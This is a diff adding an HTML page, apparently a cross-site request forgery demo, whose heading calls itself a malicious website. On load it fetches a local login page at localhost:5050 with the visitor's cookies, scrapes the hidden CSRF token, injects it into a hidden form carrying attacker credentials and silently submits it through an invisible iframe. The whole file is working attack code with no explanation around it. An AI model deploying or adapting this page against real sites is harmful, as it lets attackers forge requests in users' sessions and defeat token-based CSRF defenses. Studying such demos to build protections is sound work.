@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+  </head>
+  <body>
+    <h3>我是惡意網站</h3>
+    <iframe style="display: none" name="csrf-frame"></iframe>
+    <form
+      style="display: none"
+      method="POST"
+      action="http://localhost:5050/login"
+      target="csrf-frame"
+      id="csrf-form"
+    >
+      <input name="user" value="hacker" />
+      <input name="pass" value="xxx" />
+    </form>
+
+    <script>
+      (async () => {
+        let form = document.getElementById("csrf-form");
+        fetch("http://localhost:5050/login", { credentials: "include" })
+          .then((result) => {
+            return result.text();
+          })
+          .then((text) => {
+            let token = text.match(
+              /<input type="hidden" name="csrftoken" value="(.*?)"/
+            )[1];
+
+            let tokenInput = document.createElement("input");
+            tokenInput.name = "csrftoken";
+            tokenInput.type = "hidden";
+            tokenInput.value = token;
+            form.appendChild(tokenInput);
+            form.submit();
+          });
+      })();
+    </script>
+  </body>
+</html>
